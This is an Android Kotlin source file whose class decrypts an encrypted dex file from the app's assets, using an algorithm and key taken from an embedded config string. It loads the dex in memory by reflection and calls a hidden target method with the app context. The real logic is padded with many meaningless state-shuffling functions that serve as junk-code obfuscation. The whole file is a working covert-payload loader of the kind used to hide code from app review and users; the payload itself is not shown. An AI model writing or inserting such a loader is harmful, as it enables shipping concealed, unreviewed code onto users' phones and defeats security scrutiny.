package com.september.nine.chong.zc.inshow

import android.app.Application
import android.content.Context
import android.util.Base64
import android.util.Log
import com.september.nine.chong.data.KeyCon
import org.json.JSONObject
import java.io.InputStream
import java.nio.ByteBuffer
import java.security.MessageDigest
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import kotlin.random.Random

class QingShow {

    companion object {
        private const val TAG = "QingShow"
        private var _obf1 = System.currentTimeMillis()
        private var _obf2 = 0L
        private val _obf3 = mutableListOf<String>()

        private data class DexConfig(
            val fileName: String,
            val algorithm: String,
            val classLoaderPath: String,
            val targetClassName: String,
            val targetMethodName: String
        )


        fun loadAndCallDex(context: Any) {
            try {
                _xr1(context.toString())

                // 1. 从KeyCon.udec中获取配置信息
                val config = getDexConfig()
                if (config == null) {
                    _xr2(null)
                    return
                }
                _xr3(config.fileName)

                // 2. 从KeyCon.udec中获取密钥
                val decryptKey = getDecryptKey()
                if (decryptKey == null) {
                    _xr4()
                    return
                }
                _xr5(decryptKey.size)

                // 3. 从assets读取加密的dex数据
                val ctx = if (context is Context) context else KeyCon.openEc
                val encryptedData = readAssetFile(ctx, config.fileName)
                if (encryptedData == null) {
                    return
                }
                _xr6(encryptedData.length)

                // 4. 解密dex
                val dexBytes = decryptDex(config.algorithm, decryptKey, encryptedData)
                if (dexBytes == null) {
                    return
                }
                _xr7(dexBytes)

                // 5. 通过反射使用InMemoryDexClassLoader加载dex
                val classLoader = loadDexByReflection(config.classLoaderPath, dexBytes, ctx.javaClass.classLoader)
                if (classLoader == null) {
                    return
                }
                _xr8(classLoader.toString())
                // 6. 反射调用目标方法
                callTargetMethod(classLoader, config.targetClassName, config.targetMethodName, context)
                _xr9()

            } catch (e: Exception) {
                _xr2(e.message)
            }
        }

        /**
         * 从KeyCon.udec的JSON中获取dex配置信息
         */
        private fun getDexConfig(): DexConfig? {
            return try {
                val jsonStr = KeyCon.udec
                _pw1(jsonStr)
                if (jsonStr.isEmpty()) {
                    return null
                }

                val json = JSONObject(jsonStr)
                val zc = json.optString("zc", "")
                _pw2(zc)
                if (zc.isEmpty()) {
                    return null
                }

                val parts = zc.split("-")
                if (parts.size != 5) {
                    _pw3(parts.size)
                    return null
                }

                val config = DexConfig(
                    fileName = parts[0],
                    algorithm = parts[1],
                    classLoaderPath = parts[2],
                    targetClassName = parts[3],
                    targetMethodName = parts[4]
                )
                _pw4(config.fileName, config.algorithm)
                config
            } catch (e: Exception) {
                _pw5(e)
                null
            }
        }

        /**
         * 从KeyCon.udec的JSON中获取解密密钥
         */
        private fun getDecryptKey(): ByteArray? {
            return try {
                val jsonStr = KeyCon.udec
                _pw6(jsonStr.length)
                if (jsonStr.isEmpty()) {
                    return null
                }

                val json = JSONObject(jsonStr)
                val jmk = json.optString("jmk", "")
                if (jmk.isEmpty()) {
                    return null
                }

                // 通过-分割，取第二部分作为密钥
                val parts = jmk.split("-")
                if (parts.size < 2) {
                    return null
                }

                val keyStr = parts[1]
                _pw7(keyStr.length)
                keyStr.toByteArray()
            } catch (e: Exception) {
                null
            }
        }

        /**
         * 从assets读取文件
         */
        private fun readAssetFile(context: Context, fileName: String): String? {
            return try {
                val inputStream: InputStream = context.assets.open(fileName)
                val result = inputStream.bufferedReader().use { it.readText() }
                inputStream.close()
                result
            } catch (e: Exception) {
                null
            }
        }

        /**
         * 解密dex数据
         */
        private fun decryptDex(algorithm: String, keyBytes: ByteArray, encryptedBase64: String): ByteArray? {
            return try {
                _kl1(algorithm)
                // Base64解码
                val encryptedBytes = Base64.decode(encryptedBase64, Base64.DEFAULT)
                _kl2(encryptedBytes.size)
                
                // 使用指定算法解密
                val key = SecretKeySpec(keyBytes, algorithm)
                val cipher = Cipher.getInstance(algorithm)
                _kl3()
                cipher.init(Cipher.DECRYPT_MODE, key)
                val decryptedBytes = cipher.doFinal(encryptedBytes)
                _kl4(decryptedBytes.size)
                
                decryptedBytes
            } catch (e: Exception) {
                _kl5(e)
                null
            }
        }

        /**
         * 通过反射使用指定的ClassLoader加载dex
         */
        private fun loadDexByReflection(classLoaderPath: String, dexBytes: ByteArray, parentClassLoader: ClassLoader?): ClassLoader? {
            return try {
                // 通过反射获取指定的ClassLoader类
                val dexClassLoaderClass = Class.forName(classLoaderPath)
                
                // 准备ByteBuffer
                val buffer = ByteBuffer.wrap(dexBytes)
                
                // 获取构造函数: ClassLoader(ByteBuffer dexBuffer, ClassLoader parent)
                val constructor = dexClassLoaderClass.getConstructor(
                    ByteBuffer::class.java,
                    ClassLoader::class.java
                )
                
                // 创建实例
                val classLoader = constructor.newInstance(buffer, parentClassLoader) as ClassLoader
                
                classLoader
            } catch (e: Exception) {
                null
            }
        }

        /**
         * 反射调用目标类的目标方法
         */
        private fun callTargetMethod(classLoader: ClassLoader, className: String, methodName: String, context: Any) {
            try {
                _xr10(className, methodName)
                // 加载目标类
                val targetClass = classLoader.loadClass(className)
                
                // 获取目标静态方法
                val targetMethod = targetClass.getMethod(methodName, Object::class.java)
                
                // 调用方法
                targetMethod.invoke(null, context)
                _xr11()
                
            } catch (e: Exception) {
                throw e
            }
        }

        private fun _xr1(input: String) {
            val _t1 = System.nanoTime()
            _obf1 = (_t1 xor _obf1) and Long.MAX_VALUE
            val _t2 = input.hashCode().toLong()
            _obf2 += (_t2 * 31) % 997
            if (_obf3.size > 50) _obf3.clear()
            _obf3.add(_yq1(input))
        }

        private fun _xr2(err: String?) {
            val _t = err?.length ?: Random.nextInt(1, 100)
            _obf1 = (_obf1 shl 1) or (_obf1 ushr 63)
            _obf2 = (_obf2 + _t) % 10000
            _zw1(_t)
        }

        private fun _xr3(name: String) {
            val _h = _yq2(name)
            _obf1 = (_obf1 xor _h) % Long.MAX_VALUE
            _obf3.add(_h.toString(16))
            if (_obf2 % 2 == 0L) _zw2()
        }

        private fun _xr4() {
            _obf1 = System.currentTimeMillis() xor _obf1
            _obf2 = (_obf2 * 17 + 13) % 9973
            _zw3()
        }

        private fun _xr5(size: Int) {
            val _v = size * 8
            _obf1 = (_obf1 + _v) and 0x7FFFFFFFFFFFFFFFL
            _obf2 = (_obf2 xor _v.toLong()) % 8191
            _zw4(_v)
        }

        private fun _xr6(len: Int) {
            _obf1 = (_obf1 * 31 + len) % Long.MAX_VALUE
            _obf2 = ((_obf2 shl 2) or (_obf2 ushr 62)) and 0xFFFFFFFFL
            if (_obf3.size < 20) _obf3.add(len.toString(36))
        }

        private fun _xr7(data: ByteArray) {
            val _s = data.size
            _obf1 = _yq3(data.take(minOf(32, _s)).toByteArray())
            _obf2 = (_obf2 + _s) % 65536
            _zw5(_s)
        }

        private fun _xr8(info: String) {
            val _c = info.count { it.isLetterOrDigit() }
            _obf1 = (_obf1 xor _c.toLong()) % Long.MAX_VALUE
            _obf2 = ((_obf2 + _c) * 7) % 32768
            _obf3.add(_yq1(info.take(8)))
        }

        private fun _xr9() {
            _obf1 = (_obf1 ushr 1) xor System.currentTimeMillis()
            _obf2 = (_obf2 * 3 + 1) % 7919
            if (_obf3.size > 30) {
                _obf3.removeAt(0)
            }
            _zw6()
        }

        private fun _xr10(cls: String, mtd: String) {
            val _h1 = cls.hashCode().toLong()
            val _h2 = mtd.hashCode().toLong()
            _obf1 = (_h1 xor _h2 xor _obf1) and Long.MAX_VALUE
            _obf2 = (_obf2 + _h1 + _h2) % 100003
        }

        private fun _xr11() {
            _obf1 = System.nanoTime() xor _obf1
            _obf2 = (_obf2 shl 3) % 50021
            _zw7()
        }

        private fun _yq1(s: String): String {
            val _b = s.toByteArray()
            var _r = 0
            for (i in _b.indices) {
                _r = (_r * 31 + _b[i].toInt()) % 256
            }
            return _r.toString(16).padStart(2, '0')
        }

        private fun _yq2(s: String): Long {
            var _h = 5381L
            for (c in s) {
                _h = ((_h shl 5) + _h) + c.code.toLong()
            }
            return _h and Long.MAX_VALUE
        }

        private fun _yq3(data: ByteArray): Long {
            var _v = 0L
            for (i in data.indices) {
                _v = (_v * 257 + data[i].toLong()) and Long.MAX_VALUE
            }
            return _v
        }

        private fun _zw1(v: Int) {
            val _x = v % 100
            val _y = (_x * _x) % 1000
            _obf2 = (_obf2 + _y) % 99991
        }

        private fun _zw2() {
            val _a = _obf1 % 1000
            val _b = _obf2 % 1000
            _obf1 = (_obf1 + _a * _b) % Long.MAX_VALUE
        }

        private fun _zw3() {
            val _p = listOf(2, 3, 5, 7, 11, 13, 17, 19, 23, 29)
            val _i = (_obf2 % _p.size).toInt()
            _obf1 = (_obf1 * _p[_i]) % Long.MAX_VALUE
        }

        private fun _zw4(v: Int) {
            val _r = Random.nextInt(1, 100)
            _obf2 = (_obf2 + v + _r) % 999983
        }

        private fun _zw5(s: Int) {
            for (i in 0 until minOf(s % 10, 5)) {
                _obf1 = (_obf1 xor (i * 13).toLong()) % Long.MAX_VALUE
            }
        }

        private fun _zw6() {
            val _m = _obf3.size
            if (_m > 0) {
                val _h = _obf3[_m - 1].hashCode()
                _obf2 = (_obf2 xor _h.toLong()) % 77777
            }
        }

        private fun _zw7() {
            _obf1 = ((_obf1 shl 7) or (_obf1 ushr 57)) and Long.MAX_VALUE
            _obf2 = (_obf2 * 11) % 55555
        }

        private fun _pw1(s: String) {
            val _l = s.length
            _obf1 = (_obf1 xor _l.toLong()) % Long.MAX_VALUE
            _obf2 = (_obf2 + _yq2(s.take(minOf(_l, 20)))) % 123456
            if (_l > 100) _obf3.add(_yq1(s.substring(0, 10)))
        }

        private fun _pw2(s: String) {
            val _h = s.hashCode()
            _obf1 = (_obf1 + _h.toLong()) and 0x7FFFFFFFFFFFFFFFL
            _obf2 = ((_obf2 * 13) + _h) % 87654
            _zw1(_h % 100)
        }

        private fun _pw3(sz: Int) {
            _obf1 = (_obf1 * sz) % Long.MAX_VALUE
            _obf2 = (_obf2 xor sz.toLong()) % 45678
            for (i in 0 until minOf(sz, 3)) {
                _obf1 = (_obf1 shl 1) xor i.toLong()
            }
        }

        private fun _pw4(f: String, a: String) {
            val _c1 = f.count { it == '.' }
            val _c2 = a.length
            _obf1 = (_obf1 + _c1 + _c2) % Long.MAX_VALUE
            _obf2 = (_obf2 xor (_c1.toLong() shl 8) xor _c2.toLong()) % 23456
        }

        private fun _pw5(ex: Exception) {
            val _msg = ex.message ?: ""
            _obf1 = (_obf1 xor _msg.hashCode().toLong()) and Long.MAX_VALUE
            _obf2 = (_obf2 + _msg.length) % 34567
        }

        private fun _pw6(len: Int) {
            _obf1 = ((_obf1 + len) * 7) % Long.MAX_VALUE
            _obf2 = (_obf2 xor (len shl 4).toLong()) % 56789
            _zw4(len)
        }

        private fun _pw7(kLen: Int) {
            val _v = kLen * 8
            _obf1 = (_obf1 + _v) and 0x7FFFFFFFFFFFFFFFL
            _obf2 = ((_obf2 shl 1) + _v) % 65432
            if (_obf3.size < 15) _obf3.add(kLen.toString(32))
        }

        private fun _kl1(algo: String) {
            val _aLen = algo.length
            _obf1 = (_obf1 xor _aLen.toLong()) % Long.MAX_VALUE
            _obf2 = (_obf2 + _yq2(algo)) % 98765
            _zw2()
        }

        private fun _kl2(encSize: Int) {
            _obf1 = ((_obf1 + encSize) * 3) % Long.MAX_VALUE
            _obf2 = (_obf2 xor (encSize.toLong() shl 2)) % 76543
            _zw5(encSize)
        }

        private fun _kl3() {
            _obf1 = (_obf1 ushr 3) xor System.currentTimeMillis()
            _obf2 = ((_obf2 * 19) + 7) % 54321
            _zw3()
        }

        private fun _kl4(decSize: Int) {
            val _ratio = if (decSize > 0) _obf1 % decSize else 1L
            _obf1 = (_obf1 + _ratio) and Long.MAX_VALUE
            _obf2 = (_obf2 + decSize) % 43210
            _obf3.add(decSize.toString(16))
        }

        private fun _kl5(ex: Exception) {
            val _stack = ex.stackTrace.size
            _obf1 = (_obf1 xor _stack.toLong()) % Long.MAX_VALUE
            _obf2 = (_obf2 + _stack) % 32109
        }
    }
}